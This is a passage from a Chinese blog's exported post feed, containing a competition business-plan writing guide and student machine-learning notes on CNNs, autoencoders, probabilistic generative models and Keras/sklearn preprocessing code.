title="3、商业模式及盈利模式"></a>3、商业模式及盈利模式</h2><p>1、目标客户:客户细分、不同客户的购买特点、相应产品<br>2、盈利模式:关键业务梳理、实现盈利方式、定价策略等<br>3、营收来源:主业务是什么、辅助业务有哪些<br>4、营销与推广模式:营销策略是什么，推广方式与渠道有哪些?比如是线上还是线下?To B还是ToC?要说清楚采用的模式的内在商业逻辑。<br>关键词:<strong>销售来源、盈利模式、目标客户、定价、销售推广渠道</strong>等。  </p><p>例：</p><p>盈利模式(能给我带来什么)</p><p>1、有哪些收入来源渠道<br>第四章商业模式与营销<br>4.1 商业模式<br>4.2 产品策略<br>4.3 价格策略<br>4.4 目标市场设定<br>4.5 销售策略与渠道建设<br>4.6 售后服务  </p><p>商业维度：</p><p>简单版: 代加工+研发渠道+产品服务+目标客户<br>进阶版:代加工+研发渠道+产品服务+目标客户+盈利模式+营销模式</p><h2 id="4、核心竞争力"><a href="#4、核心竞争力" class="headerlink" title="4、核心竞争力"></a>4、核心竞争力</h2><p>主要内容:<br><strong>商业项目</strong>:技术壁垒(专利、技术秘密、AMSL)、非遗、文化(同仁堂、周村烧饼)、服务(海底涝)、模式(华为全面持股) 、价格(小米)、市场空档(滴滴)、客户规模 (滴滴)、人力成本等。<br>关键词:<strong>竞争对手、核心竞争力、竞争壁垒、渠道优势、差异化</strong></p><p><strong>竞争分析/竞争优势等</strong></p><p>1、你能做别人不能做的<br>2、你能做的比别人做的更好的</p><h2 id="5、团队介绍"><a href="#5、团队介绍" class="headerlink" title="5、团队介绍"></a>5、团队介绍</h2><p>1、讲清楚创始团队<strong>背景</strong>及擅长的<strong>专业方向</strong><br>2、岗位职责匹配明确:人员背景、知识结构、个人能力等要<br><strong>符合</strong>岗位要求<br>3、组织<strong>架构</strong>严谨，各部门分工明确，配合有序<br>4、外部<strong>背书</strong>:有专业经验的导师、专家、高管背书</p><h2 id="6、财务分析"><a href="#6、财务分析" class="headerlink" title="6、财务分析"></a>6、财务分析</h2><p>主要内容:</p><p><strong>财务预算和计划投入、财务预测及报表、财务指标与盈利能力分析</strong></p><p>报表:资产负债表、损益表、现金流量表等。财务指标:偿债能力(资产负债率、流动比率等)、运营能力(应收账款周转率存货周转率)、盈利能力(资本金利润率、成本费用利润率)等。</p><p>注意:<br>1、和计划书其他内容保持一致，年份一致，预测基础一致。<br>2、数据来源真实，假设合理(预估的增长率要合理)、计算准备。  </p><p><strong>对于创意组—-重在预算和支撑材料<br>对于创业组: 重在已知推未知</strong></p><p>例：</p><p>财务分与融资计划/投资计划</p><p>1、对于创意组—-重在预算和支撑材料<br>2、已经创业有收入的重在已知推未知<br>第七章 财务分析与融资计划<br>7.1 预测销售与实际销售<br>7.2 利润总结<br>7.3 会计报表<br>7.4 盈利能力<br>7.5 财务明细及用途<br>7.6 融资管理<br>7.7融资风险资本退出  </p><h2 id="7、风险与对策"><a href="#7、风险与对策" class="headerlink" title="7、风险与对策"></a>7、风险与对策</h2><p>主要内容:技术、管理、市场、经营、财务等  </p><p>注意:<br>1、风险分析要结合项目实际场景。<br><strong>2、讲完风险就得提出相应的对策</strong><br>3、对策能切实解决或者降低风险。</p><p>例：</p><p>风险分析与应对策略<br>1、风险分析要切合项目本身的实际场景<br>2、给出风险就得给出解决方式  </p><p>第八章风险与对策  </p><p>8.1 风险预测<br>8.2 风险防御与降低决策<br>8.3 融资风险  </p><h2 id="8、经营现状与规划"><a href="#8、经营现状与规划" class="headerlink" title="8、经营现状与规划"></a>8、经营现状与规划</h2><p>主要内容:<br>从<strong>产品销售</strong>角度看:产品模式、样品试制、已经量产、稳定运营等<br>从<strong>外界评价</strong>角度看:税收、就业、获奖、视察、报道等。<br>从<strong>社会价值贡献</strong>看:带动增收脱贫、消减污染总量，弘扬社会正气等。未来发展计划要分时间和空间两个维度。</p><p>1、时间上一般1-3年的详尽定量规划、中长期战略规划。<br>2、空间上包括产品品类的扩张，产品销售地域的扩张。</p><p>注意:<br>1、<strong>现状很重要，注重已经做出的成绩。</strong><br>2、规划更重要，没有足够市场和发展前景的项目没法吸引投资人的注意。<br>3、<strong>评审规则重点着重介绍</strong>。比如注重就业的，那就多提就业现状和未来。</p><h2 id="9、附件"><a href="#9、附件" class="headerlink" title="9、附件"></a>9、附件</h2><p>主要内容:<br>营业执照、商标等<br>专利、软著、作品版权<br>科技查新报告、质量检测报告、行业分析报告、专家教授推荐信等<br>政府、行业协会、创业大赛的奖励、证书等<br>商务合作照片、意向销售协议、到账证明等<br>领导肯定、用户认可、媒体报道等<br>融资合同、融资进账单据调研问卷、调研报告</p><p>注意:<br>1、规范、清晰、扫描不要拍照。<br>2、以前比赛获奖要结合实效性来斟酌考虑实际效果。<br>3、要在正文插入编号，以便查询。  </p><h2 id="10、格式修改"><a href="#10、格式修改" class="headerlink" title="10、格式修改"></a>10、格式修改</h2><p><img src="/img/2024/01/格式修改1.png" alt="格式修改1"></p><p><img src="/img/2024/01/格式修改2.png" alt="格式修改2"></p>]]></content>
      
      
      <categories>
          
          <category> 学园生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挑战杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习笔记——卷积神经网络、自编码器</title>
      <link href="/2024/01/22/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E3%80%81%E8%87%AA%E7%BC%96%E7%A0%81%E5%99%A8/"/>
      <url>/2024/01/22/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E3%80%81%E8%87%AA%E7%BC%96%E7%A0%81%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现虽然玩了一次卷积神经网络，但还没有写文章分析下它在干什么。</p><p>and今天瞅了眼自编码器和深度生成模型，生成宝可梦感觉真好玩啊（x</p><p>视频链接：<a href="https://study.163.com/course/courseMain.htm?courseId=1208946807">李宏毅机器学习中文课程 - 网易云课堂 (163.com)</a></p><h1 id="一、卷积神经网络"><a href="#一、卷积神经网络" class="headerlink" title="一、卷积神经网络"></a>一、卷积神经网络</h1><h2 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1. 应用场景"></a>1. 应用场景</h2><ol><li>在图片处理中，我们想要捕捉的特征远比整张图片的尺寸要小，无需对所有像素作线性组合</li><li>我们想要捕捉的特征可以在图片的不同位置出现，因此一些hidden layer的参数会相等导致冗余</li><li>降低图片的分辨率几乎不会影响判断结果，可以降低数据维度加快计算</li></ol><p>我们将以上三点更加抽象地描述为：</p><p><strong>1. 特定信息只存在于完整数据中的一部分</strong><br><strong>2. 特定信息在完整数据中多次出现</strong><br><strong>3. 降采样对结果不会有影响</strong></p><h2 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2. 解决方案"></a>2. 解决方案</h2><ol><li>在<strong>卷积层</strong>：<br>利用卷积核抽取我们需要的特定信息，卷积核只作用于输入数据中的一定区域（解决了<strong>问题1</strong>），并以一定步长在输入数据上移动（解决了<strong>问题2</strong>）。</li></ol><ol><li>在<strong>池化层</strong>：<br>用某个数值代表特定区域的数值，成倍地降低数据地空间大小（解决了<strong>问题3</strong>）</li></ol><h2 id="3-更多示例"><a href="#3-更多示例" class="headerlink" title="3. 更多示例"></a>3. 更多示例</h2><p>当一个问题满足上述的三个条件时，就可以利用卷积神经网络来train一个合适的模型。</p><p>实际上，卷积和池化不一定要同时出现。</p><p>比如，在下五子棋时，判断当前棋局的问题<strong>满足问题1和问题2</strong>，但是<strong>不满足问题3</strong></p><p>由2可知，卷积层解决的是问题1和问题2，池化层解决的是问题3。</p><p>因此，我们只需要使用卷积来处理五子棋的问题。</p><h1 id="二、自编码器"><a href="#二、自编码器" class="headerlink" title="二、自编码器"></a>二、自编码器</h1><h2 id="1-何为自编码器"><a href="#1-何为自编码器" class="headerlink" title="1. 何为自编码器"></a>1. 何为自编码器</h2><p>在使用PCA时，我们得到一个矩阵$M$将原始的高维数据$x$转换为低维数据$z$，同时可以利用$M^T$对低维数据$z$作逆变换得到$\widehat{x}$。但是在高维向低维投影的过程中出现了损失，所以逆变换得到的$\widehat{x}$与原来的$x$存在<strong>不小的偏差</strong></p><p>PCA原理参考：<a href="https://juejin.cn/post/7324200561917378579#heading-12">机器学习笔记——机器学习系统设计、支持向量机(SVM)、K-Means算法、主成分分析法(PCA) - 掘金 (juejin.cn)</a></p><p>在神经网络中，一个hidden layer的参数就是一个矩阵，所以我们可以将上述过程描述为:</p><script type="math/tex; mode=display">Input Layer(x) \rightarrow Hidden Layer(参数为M, 得到z) \rightarrow Output Layer(参数为 M^T 得到,  \widehat{x} )</script><p>我们将前面的过程称作编码(Encode)，后面的过程称作(解码)，中间输出的编码后的低维数据称作code</p><p>我们现在希望编码和解码的过程，能够<strong>尽可能地减小损失，最大程度地还原数据</strong></p><p>不妨分别将编码和解码过程抽象为神经网络，然后在训练的过程最小化$x$ 和 $ \widehat{x} $之间的偏差：</p><script type="math/tex; mode=display">x  \rightarrow NN\space Encoder \rightarrow code \rightarrow NN\space Decoder \rightarrow \widehat{x}</script><p>于是我们就利用了没有任何标签的数据，训练了一个能自动解码和编码的神经网络，而且解码和编码模块都能单独拎出来用，这就是自编码器</p><h2 id="2-自编码器的神奇之处"><a href="#2-自编码器的神奇之处" class="headerlink" title="2. 自编码器的神奇之处"></a>2. 自编码器的神奇之处</h2><h3 id="2-1-CNN与自编码器"><a href="#2-1-CNN与自编码器" class="headerlink" title="2.1 CNN与自编码器"></a>2.1 CNN与自编码器</h3><p>在卷积神经网络中，我们可以将卷积和池化操作也看作是编码过程，本质是提取低维的特定信息。</p><p>对应地，将解码过程称作反卷积和反池化：</p><ol><li>反卷积的操作与卷积一致</li><li>反池化将数据扩大时，多出来的空间可以置零，或取相同的值</li></ol><h3 id="2-2-预训练-Pre-training"><a href="#2-2-预训练-Pre-training" class="headerlink" title="2.2 预训练(Pre-training)"></a>2.2 预训练(Pre-training)</h3><p>在神经网络层次比较深时，需要拟合大量的参数。</p><p>我们可以将每个Hidden Layer（注意：不包括输出层）视作一个编码器，先利用<strong>大量的无标签数据</strong>依次对每个Hidden Layer的参数作初始化，这个过程叫预训练(Pre-training)。</p><p>最后在随机初始化输出层的参数，再利用<strong>少量标签数据</strong>训练模型。在这里，大部分的参数已经被预训练确定了七七八八，所以训练阶段只是在做微调(fine-tuning)</p><h3 id="2-3-生成新数据"><a href="#2-3-生成新数据" class="headerlink" title="2.3 生成新数据"></a>2.3 生成新数据</h3><p>特别有趣的是，我们可以自己设定一些code，丢进解码器中，这样就得到许多新数据。</p><p>将真的原始数据生成的code作Normalization，然后划定真code比较密集的一个范围作为我们的假code，可以使我们选择的code更有意义。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> CNN </tag>
            
            <tag> 自编码器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——概率生成模型</title>
      <link href="/2024/01/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%A6%82%E7%8E%87%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/"/>
      <url>/2024/01/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%A6%82%E7%8E%87%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>吴恩达的视频里没提到概率生成模型，在李宏毅的作业2看到了，感觉挺有必要理解的，可以很自然而然地引出逻辑回归的模型。</p><p>参考：<a href="https://study.163.com/course/courseLearn.htm?courseId=1208946807">李宏毅机器学习中文课程 - 网易云课堂：分类：概率生成模型</a></p><h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>已知m组数据$x^{(1)}, x^{(2)}, …, x^{(m)}$，每组数据表示n个特征,可写为一个n维的向量<br>即：<script type="math/tex">(x^{(i)})^T = ( x^{(i)}_1, ..., x^{(i)}_n)</script><br>且每组数据的真实值$y^{(i)}$只能为0或1</p><p>给定一个数据$x$，预测$x$对应的$y$值。</p><h1 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h1><h2 id="1-贝叶斯公式求概率表达式"><a href="#1-贝叶斯公式求概率表达式" class="headerlink" title="1. 贝叶斯公式求概率表达式"></a>1. 贝叶斯公式求概率表达式</h2><p>由题可知，我们根据真实值将$m$组数据分为两类$C_0$和$C_1$，其中$C_0$代表真实值为$0$的数据的集合，一共有$m_0$组，$C_1$代表真实值为$1$的数据的集合，一共有$m_1$组</p><p>那么给定数据$x$，由贝叶斯公式，$x$出现在$C_0$的概率为</p><script type="math/tex; mode=display">P(C_0 | x) = \frac{P(x | C_0) P(C_0)} { P(x | C_0) P(C_0) + P(x | C_1) P(C_1) }</script><script type="math/tex; mode=display">P(C_0 | x) = \frac{1} { 1 + \frac{P(x | C_1) P(C_1)}{P(x | C_0) P(C_0)} }</script><p>其中，$P(x | C_0)$代表给定集合$C_0$，出现数据为$x$的概率，即</p><script type="math/tex; mode=display">P(x | C_0) = f_{\mu^0, \Sigma^0}(x)</script><p>其中$ \mu^0 $ 和 $ \Sigma^0 $为$ C_0 $的均值和协方差矩阵，由$C_0$确定。</p><p>同理，$ P(x | C_1) = f_{\mu^1, \Sigma^1}(x) $</p><p>而$P(C_0)$代表随机取一组数据在$C_0$的概率，即$ P(C_0) = \frac{m_0}{m_0 + m_1} $</p><p>同理，$ P(C_1) = \frac{m_1}{m_0 + m_1} $</p><h2 id="2-由数据集求概率密度函数"><a href="#2-由数据集求概率密度函数" class="headerlink" title="2. 由数据集求概率密度函数"></a>2. 由数据集求概率密度函数</h2><p>当数据足够大时，由中心极限定理，$C_0$服从正态分布</p><script type="math/tex; mode=display">f_{\mu^0, \Sigma^0}(x) = \frac{1}{ (2\pi)^{\frac{n}{2}} |\Sigma^0|^{ \frac{1}{2}}} exp(-\frac{1}{2} (x - \mu^0)^T (\Sigma^0)^{-1} (x - \mu^0))</script><p>由已有数据求$ \mu^0 $和 $\Sigma^0$的最大似然估计为</p><script type="math/tex; mode=display">\mu^0 = \frac{1}{m_0} \sum_{i: y^{(i)} = 0} x^{(i)}</script><script type="math/tex; mode=display">\Sigma^0 = \frac{1}{m_0} \sum_{i: y^{(i)} = 0} (x^{(i)} - \mu^0) (x^{(i)} - \mu^0)^T</script><p>同理，由$C_1$确定的概率分布函数、均值、协方差矩阵为</p><script type="math/tex; mode=display">f_{\mu^1, \Sigma^1}(x) = \frac{1}{ (2\pi)^{\frac{n}{2}} |\Sigma^1|^{ \frac{1}{2}}} exp(-\frac{1}{2} (x - \mu^1)^T (\Sigma^1)^{-1} (x - \mu^1))</script><script type="math/tex; mode=display">\mu^1 = \frac{1}{m_1} \sum_{i: y^{(i)} = 1} x^{(i)}</script><script type="math/tex; mode=display">\Sigma^1 = \frac{1}{m_1} \sum_{i: y^{(i)} = 1} (x^{(i)} - \mu^1) (x^{(i)} - \mu^1)^T</script><h2 id="3-公式整理"><a href="#3-公式整理" class="headerlink" title="3. 公式整理"></a>3. 公式整理</h2><p>对1中表达式做变形，令</p><script type="math/tex; mode=display">\frac{P(x | C_1) P(C_1)}{P(x | C_0) P(C_0)}  = e^{-z}</script><p>得</p><script type="math/tex; mode=display">P(C_0 | x) =  \frac{1} { 1 + e^{-z} } = g(z)</script><script type="math/tex; mode=display">z = -\ln {\frac{P(x | C_1) P(C_1)}{P(x | C_0) P(C_0)} } = \ln {\frac{P(x | C_0) }{ P(x | C_1)} } + \ln { \frac{ P(C_0) }{ P(C_1) } }</script><p>将2中概率分布函数代入到表达式中，得</p><script type="math/tex; mode=display">z = \ln{\frac{ |\Sigma|^1}{ | \Sigma|^0 } } - \frac{1}{2} (x - \mu^0)^T (\Sigma^0)^{-1} (x - \mu^0) + \frac{1}{2} (x - \mu^1)^T (\Sigma^1)^{-1} (x - \mu^1)) + \ln{ \frac{m_0}{m_1}}</script><p>若将$\Sigma^0$和$\Sigma^1$等同为一个值$\Sigma$（未考究），可继续化简得：</p><script type="math/tex; mode=display">z = (\mu^0 - \mu^1)^T \Sigma^{-1} x - \frac{1}{2} (\mu^0)^T \Sigma^{-1} \mu^0 + \frac{1}{2} (\mu^1)^T \Sigma^{-1} \mu^1 + \ln{ \frac{m_0}{m_1}}</script><p>令$ z = \omega x + b$，则有</p><script type="math/tex; mode=display">\omega = (\mu^0 - \mu^1)^T \Sigma^{-1}</script><script type="math/tex; mode=display">b = - \frac{1}{2} (\mu^0)^T \Sigma^{-1} \mu^0 + \frac{1}{2} (\mu^1)^T \Sigma^{-1} \mu^1 + \ln{ \frac{m_0}{m_1}}</script><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>既然预测$x$在一个分类中的概率$P(C_0 | x)$，能被关于$x$与某一向量的线性组合的函数，即$\omega x+ b$，$g(\omega x + b) = \frac{1}{1+ e^{\omega x+ b}}$，我们不妨假设向量</p><script type="math/tex; mode=display">\theta^T x = \omega x + b</script><p>这就很好的解释了为什么要引入$g(\theta^T x)$作为逻辑回归的假设。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 逻辑回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入分解机器学习实战作业模板代码——二分类、卷积神经网络</title>
      <link href="/2024/01/20/%E6%B7%B1%E5%85%A5%E5%88%86%E8%A7%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E4%BD%9C%E4%B8%9A%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E7%B1%BB%E3%80%81%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/01/20/%E6%B7%B1%E5%85%A5%E5%88%86%E8%A7%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E4%BD%9C%E4%B8%9A%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E7%B1%BB%E3%80%81%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刷完理论课去找实战打，找了李宏毅的课程实战，教的是Keras，代码能一行行分析明白，但是是真的一点都不会写。于是去b站找视频补了点实战知识。</p><p>本篇文章将分解作业2和作业3提供的模板代码，提炼出模型训练时的常用操作，包括csv文件的输入输出，numpy的数组操作，keras训练模型的步骤等。</p><p>实战来自李宏毅的机器学习课程：<a href="https://study.163.com/course/courseMain.htm?courseId=1208946807">李宏毅机器学习中文课程 - 网易云课堂 (163.com)</a></p><p>Keras实战视频链接：<a href="https://www.bilibili.com/video/BV15K411k7nD">深度学习框架【Keras项目实战】</a></p><p>作业Kaggle链接：</p><ol><li>收入预测：<a href="https://www.kaggle.com/competitions/ml2019spring-hw2">ML2019SPRING-hw2 | Kaggle</a></li><li>图片情绪分类：<a href="https://www.kaggle.com/competitions/ml2019spring-hw3">ML2019SPRING-hw3 | Kaggle</a></li></ol><h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><h2 id="1-收入预测"><a href="#1-收入预测" class="headerlink" title="1. 收入预测"></a>1. 收入预测</h2><p>根据给定的个人资讯，预测此人的收入能否大于50K。</p><p>数据集X_train包含许多个人信息，Y_train对应他们年收入是否大于50K。训练一个二分类模型，对X_test作预测。</p><p>模板代码：</p><p>概率生成模型(Probabilistic Generative Model)： <a href="https://ntumlta2019.github.io/ml-web-hw2/ProbabilisticGenerativeModel.html">ProbabilisticGenerativeModel (ntumlta2019.github.io)</a></p><p>逻辑回归(Logistic Regression)：<a href="https://ntumlta2019.github.io/ml-web-hw2/LogisticRegression.html">LogisticRegression (ntumlta2019.github.io)</a></p><h2 id="2-图片情绪分类"><a href="#2-图片情绪分类" class="headerlink" title="2. 图片情绪分类"></a>2. 图片情绪分类</h2><p>给定48$*$48像素的图片，判断该图片所表达的情绪，包括0：生气, 1：厌恶, 2：恐惧, 3：高兴, 4：难过, 5：惊讶, 6：中立）</p><p>训练集x_train.csv每一行有两列，第一列label为图片的情绪，第二列为48$*$48个像素值，范围从0~255。训练一个卷积神经网络，对x_test.csv作预测</p><p>模板代码：<a href="https://hackmd.io/hlJAABuoRJa0tzpD8UUHvw">2019 Spring ML HW3 - 手把手教學 - HackMD</a></p><h1 id="二、处理输入输出"><a href="#二、处理输入输出" class="headerlink" title="二、处理输入输出"></a>二、处理输入输出</h1><h2 id="1-读取csv文件"><a href="#1-读取csv文件" class="headerlink" title="1. 读取csv文件"></a>1. 读取csv文件</h2><ul><li><p>利用np.genfromtxt() 需要添加参数delimeter=’,’ 返回的结果是<strong>列表</strong>而不是ndarray对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_train = np.genfromtxt(path, delimiter=<span class="string">&#x27;,&#x27;</span>, dtype=<span class="built_in">str</span>, skip_header=<span class="number">1</span>) <span class="comment"># skip_header=1</span></span><br></pre></td></tr></table></figure></li><li><p>引入python自带的csv包，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    raw_train = np.array(<span class="built_in">list</span>(csv.reader(csvfile))[<span class="number">1</span>:], dtype=<span class="built_in">float</span>) <span class="comment"># 取下标[1:]表示去掉表头</span></span><br></pre></td></tr></table></figure><h2 id="2-归一化-标准化-离散化"><a href="#2-归一化-标准化-离散化" class="headerlink" title="2. 归一化/标准化/离散化"></a>2. 归一化/标准化/离散化</h2><p>归一化：$x = \frac{x - x_{min}}{x_{max} - x_{min}}$</p></li></ul><p>标准化：$x = \frac{x - \mu}{\sigma}$</p><p>离散化：将数据标签1，2, …, n转化为[1, 0, …, 0], [0, 1, …, 0], …, [0, 0, …, 1]</p><h3 id="2-1-手动处理"><a href="#2-1-手动处理" class="headerlink" title="2.1 手动处理"></a>2.1 手动处理</h3><ol><li><p>归一化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="built_in">min</span> = np.<span class="built_in">min</span>(rows, axis=<span class="number">0</span>).reshape(<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">self.std = np.std(rows, axis=<span class="number">0</span>).reshape(<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">self.theta = np.ones((rows.shape[<span class="number">1</span>] + <span class="number">1</span>, <span class="number">1</span>), dtype=<span class="built_in">float</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows.shape[<span class="number">0</span>]):</span><br><span class="line">    rows[i, :] = (rows[i, :] - self.<span class="built_in">min</span>) / self.std</span><br></pre></td></tr></table></figure></li><li><p>标准化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.mean = np.mean(rows, axis=<span class="number">0</span>).reshape(<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">self.std = np.std(rows, axis=<span class="number">0</span>).reshape(<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">self.theta = np.ones((rows.shape[<span class="number">1</span>] + <span class="number">1</span>, <span class="number">1</span>), dtype=<span class="built_in">float</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows.shape[<span class="number">0</span>]):</span><br><span class="line">    rows[i, :] = (rows[i, :] - self.mean) / self.std</span><br></pre></td></tr></table></figure></li></ol><p><strong>对于axis的理解</strong>：axis=i，操作沿着第i个下标变化的方向进行<br>参考：<a href="https://zhuanlan.zhihu.com/p/31275071">Numpy:对Axis的理解 - 知乎 (zhihu.com)</a></p><h3 id="2-2-利用sklearn"><a href="#2-2-利用sklearn" class="headerlink" title="2.2 利用sklearn"></a>2.2 利用sklearn</h3><ol><li>归一化：MinMaxScaler<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler, StandardScaler</span><br><span class="line">data = np.array([[-<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">3</span>, -<span class="number">4</span>, -<span class="number">5</span>],</span><br><span class="line">                    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]])</span><br><span class="line">minMaxScaler = MinMaxScaler()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在处理训练数据时使用fit_transform</span></span><br><span class="line">data = minMaxScaler.fit_transform(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">[[0.  0.  0.  0.  0. ]</span></span><br><span class="line"><span class="string"> [0.5 0.5 0.5 0.5 0.5]</span></span><br><span class="line"><span class="string"> [1.  1.  1.  1.  1. ]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">test_data = np.array([[-<span class="number">2</span>, -<span class="number">3</span>, -<span class="number">4</span>, -<span class="number">5</span>, -<span class="number">6</span>],</span><br><span class="line">                    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                    [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="comment"># 在处理测试数据时使用transform</span></span><br><span class="line">test_data = minMaxScaler.transform(test_data)</span><br></pre></td></tr></table></figure></li><li><p>标准化：StandardScaler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">data = np.array([[-<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">3</span>, -<span class="number">4</span>, -<span class="number">5</span>],</span><br><span class="line">                    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]])</span><br><span class="line">stdScaler = StandardScaler()</span><br><span class="line"><span class="comment"># 在处理训练数据时使用fit_transform</span></span><br><span class="line">data = stdScaler.fit_transform(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">[[-1.22474487 -1.22474487 -1.22474487 -1.22474487 -1.22474487]</span></span><br><span class="line"><span class="string"> [ 0.          0.          0.          0.          0.        ]</span></span><br><span class="line"><span class="string"> [ 1.22474487  1.22474487  1.22474487  1.22474487  1.22474487]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在处理测试数据时使用transform</span></span><br><span class="line">test_data = np.array([[-<span class="number">2</span>, -<span class="number">3</span>, 